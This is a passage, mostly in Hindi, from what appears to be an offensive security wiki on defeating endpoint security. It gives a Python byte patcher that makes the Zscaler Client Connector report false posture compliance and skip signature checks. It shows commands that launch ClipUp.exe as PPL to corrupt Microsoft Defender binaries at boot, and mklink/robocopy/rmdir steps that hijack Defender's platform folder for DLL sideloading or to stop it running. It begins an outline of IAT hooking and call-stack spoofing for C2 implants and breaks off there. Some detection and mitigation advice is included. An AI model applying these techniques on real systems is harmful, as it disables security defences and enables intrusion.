тАв user-mode рд╣реИрдВрдбрд▓реНрд╕ рдХреЛ custom device objects рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж suspicious `DeviceIoControl` рдХреЙрд▓реНрд╕ рдХреЗ рд▓рд┐рдП рдореЙрдирд┐рдЯрд░ рдХрд░реЗрдВред

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler рдХрд╛ **Client Connector** device-posture rules рдХреЛ рд▓реЛрдХрд▓реА рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ рдФрд░ Windows RPC рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкрд░рд┐рдгрд╛рдо рдЕрдиреНрдп рдШрдЯрдХреЛрдВ рддрдХ рднреЗрдЬреЗ рдЬрд╛ рд╕рдХреЗрдВред рджреЛ рдХрдордЬреЛрд░ рдбрд┐рдЬрд╛рдЗрди рд╡рд┐рдХрд▓реНрдк рдПрдХ рдкреВрд░реНрдг bypass рдХреЛ рд╕рдВрднрд╡ рдмрдирд╛рддреЗ рд╣реИрдВ:

1. Posture evaluation рдкреВрд░реА рддрд░рд╣ client-side рд╣реЛрддрд╛ рд╣реИ (server рдХреЛ рдПрдХ boolean рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ)ред  
2. Internal RPC endpoints рдХреЗрд╡рд▓ рдпрд╣ validate рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ connecting executable **Zscaler рджреНрд╡рд╛рд░рд╛ signed** рд╣реИ (via `WinVerifyTrust`)ред

рдбрд┐рд╕реНрдХ рдкрд░ рдЪрд╛рд░ signed рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЛ рдкреИрдЪ рдХрд░рдХреЗ рджреЛрдиреЛрдВ рдореЗрдХреИрдирд┐рдЬрд╝реНрдо рдХреЛ neutalise рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() тЖТ return 0/1` | рд╣рдореЗрд╢рд╛ `1` рд▓реМрдЯрд╛рддрд╛ рд╣реИ рдЗрд╕рд▓рд┐рдП рд╣рд░ рдЪреЗрдХ compliant рджрд┐рдЦреЗрдЧрд╛ |
| `ZSAService.exe` | WinVerifyTrust рдХреЛ indirect рдХреЙрд▓ | NOP-ed тЗТ рдХреЛрдИ рднреА (рдпрд╣рд╛рдВ рддрдХ рдХрд┐ unsigned) process RPC pipes рд╕реЗ bind рдХрд░ рд╕рдХрддрд╛ рд╣реИ |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` рд╕реЗ рдмрджрд▓ рджрд┐рдпрд╛ рдЧрдпрд╛ |
| `ZSATunnel.exe` | рдЯрдирд▓ рдкрд░ integrity checks | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
рдореВрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдмрджрд▓рдиреЗ рдФрд░ рд╕рд░реНрд╡рд┐рд╕ рд╕реНрдЯреИрдХ рдХреЛ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж:

* **рд╕рднреА** posture checks **green/compliant** рджрд┐рдЦрд╛рддреЗ рд╣реИрдВред
* Unsigned рдпрд╛ modified binaries named-pipe RPC endpoints рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрджрд╛. `\\RPC Control\\ZSATrayManager_talk_to_me`)ред
* рд╕рдВрдХреНрд░рдорд┐рдд рд╣реЛрд╕реНрдЯ Zscaler рдиреАрддрд┐рдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рддрдХ рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реЗрддрд╛ рд╣реИред

рдпрд╣ рдХреЗрд╕ рд╕реНрдЯрдбреА рджрд┐рдЦрд╛рддреА рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдХреЗрд╡рд▓ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдЯреНрд░рд╕реНрдЯ рдирд┐рд░реНрдгрдп рдФрд░ рд╕рд░рд▓ signature checks рдХреБрдЫ byte рдкреИрдЪреЗрд╕ рд╕реЗ рдкрд░рд╛рдЬрд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

## Protected Process Light (PPL) рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ LOLBINs рд╕реЗ AV/EDR рдореЗрдВ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝

Protected Process Light (PPL) рдПрдХ signer/level hierarchy рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХреЗрд╡рд▓ рд╕рдорд╛рди-рдпрд╛-рдЙрдЪреНрдЪрддрд░ protected processes рд╣реА рдПрдХ-рджреВрд╕рд░реЗ рдореЗрдВ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдХрд░ рд╕рдХреЗрдВред Offensive рддреМрд░ рдкрд░, рдпрджрд┐ рдЖрдк рд╡реИрдз рд░реВрдк рд╕реЗ рдПрдХ PPL-enabled binary рд▓реЙрдиреНрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рдХреЗ arguments рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк benign functionality (рдЙрджрд╛., logging) рдХреЛ рдПрдХ рд╕реАрдорд┐рдд, PPL-backed write primitive рдореЗрдВ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ AV/EDR рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ protected directories рдХреЗ рдЦрд┐рд▓рд╛рдл рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` рд╕реНрд╡рдпрдВ рд╕реНрдкреЙрди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдХреЙрд▓рд░-рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкрде рдкрд░ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреИрд░рд╛рдореАрдЯрд░ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИред
- рдЬрдм рдЗрд╕реЗ PPL рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдлрд╝рд╛рдЗрд▓ рд▓реЗрдЦрди PPL рдмреИрдХрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рд╣реЛрддрд╛ рд╣реИред
- ClipUp рд╕реНрдкреЗрд╕ рд╡рд╛рд▓реЗ рдкрд╛рдереНрд╕ рдХреЛ рдкрд╛рд░реНрд╕ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛; рд╕рд╛рдорд╛рдиреНрдпрддрдГ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕реНрдерд╛рдиреЛрдВ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП 8.3 short paths рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

8.3 short path helpers
- рд╢реЙрд░реНрдЯ рдирд╛рдо рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдВ: рдкреНрд░рддреНрдпреЗрдХ рдкрд░реЗрдВрдЯ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ `dir /x`ред
- cmd рдореЗрдВ рд╢реЙрд░реНрдЯ рдкрд╛рде рдирд┐рдХрд╛рд▓реЗрдВ: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-рд╕рдХреНрд╖рдо LOLBIN (ClipUp) рдХреЛ `CREATE_PROTECTED_PROCESS` рдХреЗ рд╕рд╛рде рдПрдХ рд▓реЙрдиреНрдЪрд░ (рдЬреИрд╕реЗ CreateProcessAsPPL) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдиреНрдЪ рдХрд░реЗрдВред
2) ClipUp рдХреЛ log-path argument рдкрд╛рд╕ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдПрдХ рд╕рдВрд░рдХреНрд╖рд┐рдд AV рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА (рдЙрджрд╛., Defender Platform) рдореЗрдВ рдмрдирд╛рдИ рдЬрд╛ рд╕рдХреЗред рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдиреЗ рдкрд░ 8.3 short names рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
3) рдпрджрд┐ рд▓рдХреНрд╖реНрдп рдмрд╛рдЗрдирд░реА рд╕рд╛рдорд╛рдиреНрдпрддрдГ AV рджреНрд╡рд╛рд░рд╛ рд░рди рдХрд░рддреЗ рд╕рдордп рдЦреБрд▓рд╛/рд▓реЙрдХ рд░рд╣рддрд╛ рд╣реИ (рдЙрджрд╛., MsMpEng.exe), рддреЛ AV рдХреЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдмреВрдЯ рдкрд░ рд▓реЗрдЦрди рд╢реЗрдбреНрдпреВрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ auto-start service рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ рдЬреЛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд░реВрдк рд╕реЗ рдкрд╣рд▓реЗ рдЪрд▓реЗред Process Monitor (boot logging) рдХреЗ рд╕рд╛рде рдмреВрдЯ рдСрд░реНрдбрд░рд┐рдВрдЧ рдХреЛ рдорд╛рдиреНрдп рдХрд░реЗрдВред
4) рд░реАрдмреВрдЯ рдкрд░ PPL-рдмреИрдХреНрдб рд▓реЗрдЦрди AV рдХреЗ рдмрд╛рдЗрдирд░реА рд▓реЙрдХ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд▓рдХреНрд╖реНрдп рдлрд╝рд╛рдЗрд▓ рдХрд░рдкреНрдЯ рд╣реЛ рдЬрд╛рддреА рд╣реИ рдФрд░ рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рд░реЛрдХ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- рдЖрдк ClipUp рджреНрд╡рд╛рд░рд╛ рд▓рд┐рдЦреА рдЧрдИ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЙрд╕рдХреЗ рд╕реНрдерд╛рди рд╕реЗ рдЖрдЧреЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ; рдпрд╣ primitive рд╕рдЯреАрдХ рд╕рд╛рдордЧреНрд░реА рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рднреНрд░рд╖реНрдЯрд┐рдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИред
- рд╕реНрдерд╛рдкрдирд╛/рд╕реНрдЯрд╛рд░реНрдЯ рдХрд░рдиреЗ рдФрд░ рд░реАрдмреВрдЯ рд╡рд┐рдВрдбреЛ рдХреЗ рд▓рд┐рдП local admin/SYSTEM рдЖрд╡рд╢реНрдпрдХ рд╣реИред
- рд╕рдордп-рд╕рд╛рд░рдгреА рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ: рд▓рдХреНрд╖реНрдп рдЦреБрд▓рд╛ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП; boot-time execution рдлрд╛рдЗрд▓ рд▓реЙрдХ рд╕реЗ рдмрдЪрд╛рддрд╛ рд╣реИред

Detections
- рдЕрд╕рд╛рдорд╛рдиреНрдп рддрд░реНрдХреЛрдВ рдХреЗ рд╕рд╛рде `ClipUp.exe` рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рд░реНрдорд╛рдг, рд╡рд┐рд╢реЗрд╖рдХрд░ рдЧреИрд░-рдорд╛рдирдХ рд▓реЙрдиреНрдЪрд░реЛрдВ рджреНрд╡рд╛рд░рд╛ parented, рдмреВрдЯ рдХреЗ рдЖрд╕рдкрд╛рд╕ред
- рдРрд╕реЗ рдирдП services рдЬреЛ suspicious binaries рдХреЛ auto-start рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рд▓рдЧрд╛рддрд╛рд░ Defender/AV рд╕реЗ рдкрд╣рд▓реЗ рд╕реНрдЯрд╛рд░реНрдЯ рд╣реЛрддреЗ рд╣реИрдВред Defender startup рд╡рд┐рдлрд▓рддрд╛рдУрдВ рд╕реЗ рдкрд╣рд▓реЗ service creation/modification рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВред
- Defender binaries/Platform рдбрд╛рдпрд░реЗрдХреНрдЯрд░реАрдЬрд╝ рдкрд░ file integrity monitoring; protected-process flags рд╡рд╛рд▓реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдЕрдирдкреЗрдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓ рдХреНрд░рд┐рдПрд╢рди/рдореЙрдбрд┐рдлрд┐рдХреЗрд╢рдиред
- ETW/EDR telemetry: рдЙрди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬреЛ `CREATE_PROTECTED_PROCESS` рдХреЗ рд╕рд╛рде рдмрдирд╛рдИ рдЧрдИ рд╣реИрдВ рдФрд░ non-AV рдмрд╛рдЗрдирд░реА рджреНрд╡рд╛рд░рд╛ рдЕрд╕рд╛рдорд╛рдиреНрдп PPL рд╕реНрддрд░ рдХрд╛ рдЙрдкрдпреЛрдЧред

Mitigations
- WDAC/Code Integrity: рдпрд╣ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдХреМрди рд╕реЗ signed binaries PPL рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХрд┐рди parent рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдЕрдВрддрд░реНрдЧрдд; ClipUp invocation рдХреЛ рд╡реИрдз рд╕рдВрджрд░реНрднреЛрдВ рдХреЗ рдмрд╛рд╣рд░ рдмреНрд▓реЙрдХ рдХрд░реЗрдВред
- Service hygiene: auto-start services рдХреЗ creation/modification рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░реЗрдВ рдФрд░ start-order рдореЗрдВ рд╣реЗрд░рдлреЗрд░ рдХреА рдирд┐рдЧрд░рд╛рдиреА рд░рдЦреЗрдВред
- рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ Defender tamper protection рдФрд░ early-launch protections рд╕рдХреНрд╖рдо рд╣реЛрдВ; рдмрд╛рдЗрдирд░реА рдХрд░рдкреНрд╢рди рд╕реВрдЪрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ startup errors рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
- рдпрджрд┐ рдЖрдкрдХреЗ рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рдЕрдиреБрдХреВрд▓ рд╣реЛ рддреЛ рд╕реБрд░рдХреНрд╖рд╛ рдЯреВрд▓рд┐рдВрдЧ рд╣реЛрд╕реНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╡реЙрд▓реНрдпреВрдо рдкрд░ 8.3 short-name generation рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ (рдкреВрд░реА рддрд░рд╣ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ)ред

References for PPL and tooling
- Microsoft Protected Processes рдХрд╛ рдЕрд╡рд▓реЛрдХрди: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Microsoft Defender рдХреЛ Platform Version Folder Symlink Hijack рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЗрд░рдлреЗрд░ рдХрд░рдирд╛

Windows Defender рдЙрд╕ platform рдХрд╛ рдЪрдпрди рдЙрди рд╕рдмрдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдХреА рдЧрдгрдирд╛ рдХрд░рдХреЗ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдиреАрдЪреЗ рд╣реИрдВ:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

рдпрд╣ рд╕рдмрд╕реЗ рдЙрдЪреНрдЪ lexicographic version string рд╡рд╛рд▓реЗ рд╕рдмрдлрд╝реЛрд▓реНрдбрд░ рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ (рдЙрджрд╛., `4.18.25070.5-0`), рдФрд░ рдлрд┐рд░ рд╡рд╣рд╛рдВ рд╕реЗ Defender service рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реНрдЯрд╛рд░реНрдЯ рдХрд░рддрд╛ рд╣реИ (service/registry paths рдХреЛ рддрджрдиреБрд╕рд╛рд░ рдЕрдкрдбреЗрдЯ рдХрд░рддреЗ рд╣реБрдП)ред рдпрд╣ рдЪрдпрди directory entries рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдирдореЗрдВ directory reparse points (symlinks) рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдПрдХ administrator рдЗрд╕рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ Defender рдХреЛ attacker-writable path рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ DLL sideloading рдпрд╛ service disruption рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

Preconditions
- Local Administrator (Platform рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрддрд░реНрдЧрдд directories/symlinks рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ)
- рд░реАрдмреВрдЯ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдпрд╛ Defender platform re-selection (service restart on boot) рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛
- рдХреЗрд╡рд▓ built-in tools рдХреА рдЬрд╝рд░реВрд░рдд (mklink)

Why it works
- Defender рдЕрдкрдиреА рдЦреБрдж рдХреА рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдореЗрдВ рд▓рд┐рдЦрд╛рд╡рдЯ рдмреНрд▓реЙрдХ рдХрд░рддрд╛ рд╣реИ, рдкрд░ рдЙрд╕рдХрд╛ platform рдЪрдпрди directory entries рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╕рдмрд╕реЗ рдЙрдЪреНрдЪ lexicographic version рдЪреБрдирддрд╛ рд╣реИ рдмрд┐рдирд╛ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдП рдХрд┐ рд▓рдХреНрд╖реНрдп рдПрдХ protected/trusted path рдкрд░ resolve рд╣реЛрддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform рдХреЗ рдЕрдВрджрд░ рдЕрдкрдиреЗ рдлрд╝реЛрд▓реНрдбрд░ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ higher-version directory symlink рдмрдирд╛рдПрдВ:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) рдЯреНрд░рд┐рдЧрд░ рдЪрдпрди (рд░реАрдмреВрдЯ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢):
```cmd
shutdown /r /t 0
```
4) рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░реЗрдВ рдХрд┐ MsMpEng.exe (WinDefend) рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдкрде рд╕реЗ рдЪрд▓ рд░рд╣рд╛ рд╣реИ:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
рдЖрдкрдХреЛ `C:\TMP\AV\` рдХреЗ рдЕрдВрддрд░реНрдЧрдд рдирдП process path рдФрд░ рдЙрд╕ рд╕реНрдерд╛рди рдХреЛ рджрд░реНрд╢рд╛рддреЗ рд╣реБрдП service configuration/registry рджрд┐рдЦрд╛рдИ рджреЗрдиреЗ рдЪрд╛рд╣рд┐рдПред

Post-exploitation рд╡рд┐рдХрд▓реНрдк
- DLL sideloading/code execution: рдЙрди DLLs рдХреЛ drop/replace рдХрд░реЗрдВ рдЬрд┐рдиреНрд╣реЗрдВ Defender рдЕрдкрдиреЗ application directory рд╕реЗ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ Defender рдХреА processes рдореЗрдВ code execute рд╣реЛ рд╕рдХреЗред рдКрдкрд░ рдХреЗ рд╕реЗрдХреНрд╢рди рдХреЛ рджреЗрдЦреЗрдВ: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink рдХреЛ рд╣рдЯрд╛рдПрдБ рддрд╛рдХрд┐ рдЕрдЧрд▓реА start рдкрд░ configured path resolve рди рд╣реЛ рдФрд░ Defender start рди рдХрд░ рдкрд╛рдП:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рддрдХрдиреАрдХ рд╕реНрд╡рдпрдВ рдореЗрдВ privilege escalation рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд░рддреА; рдЗрд╕рдХреЗ рд▓рд┐рдП admin rights рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВред

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams C2 implant рд╕реЗ runtime evasion рдХреЛ рд╣рдЯрд╛рдХрд░ target module рдореЗрдВ рд╣реА рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рдХреЗ Import Address Table (IAT) рдХреЛ hook рдХрд░рдХреЗ рдФрд░ рдЪреБрдиреА рд╣реБрдИ APIs рдХреЛ attacker-controlled, positionтАСindependent code (PIC) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░реВрдЯ рдХрд░рдХреЗред рдпрд╣ рдЙрди рдЫреЛрдЯреЗ API surface рд╕реЗ рдкрд░реЗ evasion рдХреЛ рд╕рд╛рдорд╛рдиреНрдп рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдХрдИ kits рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рддреЗ рд╣реИрдВ (рдЙрджрд╛., CreateProcessA), рдФрд░ рд╡рд╣реА рд╕реБрд░рдХреНрд╖рд╛ BOFs рдФрд░ postтАСexploitation DLLs рдкрд░ рднреА рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИред

High-level approach
- Reflective loader (prepended рдпрд╛ companion) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ target module рдХреЗ рд╕рд╛рде рдПрдХ PIC blob рд╕реНрдЯреЗрдЬ рдХрд░реЗрдВред PIC selfтАСcontained рдФрд░ positionтАСindependent рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
- рдЬрдм host DLL рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕рдХреЗ IMAGE_IMPORT_DESCRIPTOR рдХреЛ рд╡реЙрдХ рдХрд░реЗрдВ рдФрд░ targeted imports (рдЙрджрд╛., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) рдХреЗ рд▓рд┐рдП IAT рдПрдВрдЯреНрд░реАрдЬрд╝ рдХреЛ thin PIC wrappers рдХреА рдУрд░ patch рдХрд░реЗрдВред
- рдкреНрд░рддреНрдпреЗрдХ PIC wrapper рд╡рд╛рд╕реНрддрд╡рд┐рдХ API address рдХреЛ tailтАСcall рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ evasions рдЪрд▓рд╛рддрд╛ рд╣реИред рд╕рд╛рдорд╛рдиреНрдп evasions рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:
  - рдХреЙрд▓ рдХреЗ рдЖрд╕тАСрдкрд╛рд╕ memory mask/unmask (рдЙрджрд╛., beacon regions encrypt рдХрд░рдирд╛, RWXтЖТRX, page names/permissions рдмрджрд▓рдирд╛) рдФрд░ рдлрд┐рд░ рдХреЙрд▓ рдХреЗ рдмрд╛рдж restore рдХрд░рдирд╛ред
  - CallтАСstack spoofing: рдПрдХ benign stack рдмрдирд╛рдХрд░ target API рдореЗрдВ transition рдХрд░рдирд╛ рддрд╛рдХрд┐ callтАСstack analysis рдЕрдкреЗрдХреНрд╖рд┐рдд frames рдХреЛ resolve рдХрд░реЗред
- Compatibility рдХреЗ рд▓рд┐рдП рдПрдХ interface export рдХрд░реЗрдВ рддрд╛рдХрд┐ рдПрдХ Aggressor script (рдпрд╛ рд╕рдордХрдХреНрд╖) рдпрд╣ register рдХрд░ рд╕рдХреЗ рдХрд┐ Beacon, BOFs рдФрд░ postтАСex DLLs рдХреЗ рд▓рд┐рдП рдХреМрдитАСрд╕реА APIs hook рдХрд░рдиреА рд╣реИрдВред

Why IAT hooking here
